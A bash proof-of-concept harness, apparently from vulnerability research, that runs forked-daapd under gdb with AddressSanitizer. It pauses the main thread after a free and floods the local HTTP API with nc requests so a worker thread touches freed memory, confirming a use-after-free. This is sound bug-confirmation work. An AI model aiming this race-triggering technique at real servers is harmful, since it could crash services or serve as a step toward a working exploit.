#!/bin/bash
# 最终版：stdin 管道驱动 gdb，停住后 driver 编排（finish→风暴→读探测）
cd /home/ubuntu/experiments/forked-daapd || exit 9
sudo /etc/init.d/dbus start >/dev/null 2>&1
sudo /etc/init.d/avahi-daemon start >/dev/null 2>&1
sleep 1
export ASAN_OPTIONS='abort_on_error=1:symbolize=1:detect_leaks=0'
mkdir -p /home/ubuntu/experiments/db /home/ubuntu/experiments/MP3
chown -R ubuntu:ubuntu /home/ubuntu/experiments 2>/dev/null
rm -f /home/ubuntu/experiments/db/songs3.db

rm -f /tmp/gdbin; mkfifo /tmp/gdbin
( tail -f /tmp/gdbin | gdb -q -x /poc/bracket_cmds.gdb --args \
    ./src/forked-daapd -d 0 -c /home/ubuntu/experiments/forked-daapd.conf -f \
    > /out/poc-final.log 2>&1 ) &
GP=$!
sleep 3
echo "run" > /tmp/gdbin

UP=0
for w in $(seq 1 240); do (exec 3<>/dev/tcp/127.0.0.1/3689) 2>/dev/null && UP=1 && break; sleep 0.25; done
echo "[driver] up=$UP"
for i in 1 2 3; do
  printf 'GET /api/player/play HTTP/1.1\r\nHost: x\r\n\r\n' | timeout 1 nc -q 0 127.0.0.1 3689 >/dev/null 2>&1; sleep 0.3
done
kill -TERM $(pgrep -x forked-daapd | head -1) 2>/dev/null

# 等 POC-2 停住
for w in $(seq 1 60); do grep -q 'POC-2' /out/poc-final.log 2>/dev/null && break; sleep 1; done
sleep 2
echo "[driver] orchestrating: finish (target frees) -> storm -> probe"
echo "finish" > /tmp/gdbin
sleep 3
# 目标已 free；风暴期间不断从 driver 发 stepi？不行——主线程必须保持停住。
# 直接在停住状态读悬垂内存：gdb 的 x 命令读内存= probe（gdb 读 inferior 内存
# 走 ptrace，绕过 ASAN 检查 —— 这就是之前 probe ok 的原因！）。
# 所以唯一能让 ASAN 报的读 = 目标代码自己读。让 worker 来读：
#   主线程停住 + 风暴线程打 player API（worker status_update→listener_notify
#   遍历链表）→ worker 读到已 free 节点 → ASAN 崩。
( end=$(( $(date +%s) + 25 ))
  while [ $(date +%s) -lt $end ]; do
    printf 'GET /api/player/play HTTP/1.1\r\nHost: x\r\n\r\n' | timeout 0.5 nc -q 0 127.0.0.1 3689 >/dev/null 2>&1
    printf 'GET /api/queue/items/add?expression=1 HTTP/1.1\r\nHost: x\r\n\r\n' | timeout 0.5 nc -q 0 127.0.0.1 3689 >/dev/null 2>&1
    sleep 0.15
  done ) &
ST=$!
echo "[driver] storm running 25s while main thread held at post-free"
sleep 28
echo "continue" > /tmp/gdbin
sleep 5
echo "quit" > /tmp/gdbin
sleep 2
kill -9 $GP 2>/dev/null; kill $ST 2>/dev/null
echo "=== key lines ==="
grep -E 'POC-|AddressSanitizer' /out/poc-final.log | head -20
grep -q "ERROR: AddressSanitizer" /out/poc-final.log && echo "*** ASAN UAF CAPTURED ***" || echo "no ASAN"
